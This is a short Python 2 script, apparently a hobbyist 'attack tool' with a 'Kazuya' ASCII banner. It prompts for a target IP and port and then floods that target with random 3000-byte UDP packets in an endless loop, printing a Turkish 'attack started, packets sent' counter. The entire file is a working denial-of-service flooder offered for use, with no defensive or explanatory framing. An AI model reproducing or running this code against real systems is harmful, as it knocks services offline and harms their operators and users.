import random
import socket
import threading
import os,sys

os.system("clear")
print('''
    KAZUYA AND TEAM
 
╭╮╭━╮
┃┃┃╭╯
┃╰╯╯╭━━┳━━━┳╮╭┳╮╱╭┳━━╮
┃╭╮┃┃╭╮┣━━┃┃┃┃┃┃╱┃┃╭╮┃
┃┃┃╰┫╭╮┃┃━━┫╰╯┃╰━╯┃╭╮┃
╰╯╰━┻╯╰┻━━━┻━━┻━╮╭┻╯╰╯
╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃
╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯
                                
''')
print("Tools By Kazuya")
hedef_ip=raw_input("Target IP: => ")
hedef_port=input("Target Port: => ")

bytes=random._urandom(3000)
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

sayac=0
while True:
	sock.sendto(bytes,(hedef_ip,hedef_port))
	sayac=sayac+1
	print("saldiri baslatildi,gonderilen paket:%s"%(sayac))
